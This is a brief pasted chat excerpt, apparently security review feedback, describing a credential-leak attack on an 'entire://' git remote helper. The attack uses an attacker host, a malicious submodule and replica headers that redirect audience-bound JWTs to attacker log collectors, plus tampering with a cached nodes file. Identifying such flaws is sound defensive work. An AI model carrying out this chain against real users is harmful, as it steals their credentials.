@@ -1,0 +1,12 @@
+I got this feedback:
+
+1. Attacker hosts https://evil.example.com and serves a /.well-known/entire-cluster.json that lists the user's actual core (e.g.
+  https://us.auth.entire.io) — any user with a context for that core is now a viable target.
+  2. Victim runs git clone entire://evil.example.com/whatever.
+  3. The helper resolves the user's existing context, mints a JWT via the user's real core with aud=https://evil.example.com/whatever, scope=repo:pull
+   — fine, that JWT is bound to the attacker.
+  4. Attacker's info/refs response returns X-Entire-Replicas: https://canarytokens.com/foo, https://attacker-log-collector.example.com.
+  5. Helper now POSTs git-upload-pack and any subsequent calls to those URLs with the audience-bound JWT attached.
+
+This could be exploited via submodule. So for example,  legit repo in entiredb with a submodule pointing to the entire://evil.example.com/whatever. Haven't tested it (as I haven't for the other 3) but sounds reasonable. We have a similar issue with the cached nodes file in disk.
+[3:00 PM]Anything running in the context of the user that amends ~/.cache/entire/nodes.json will lead to credential leaks. I think we tight this down, ideally we would restrict pushing of tokens to specific domains. But this could leak partial.
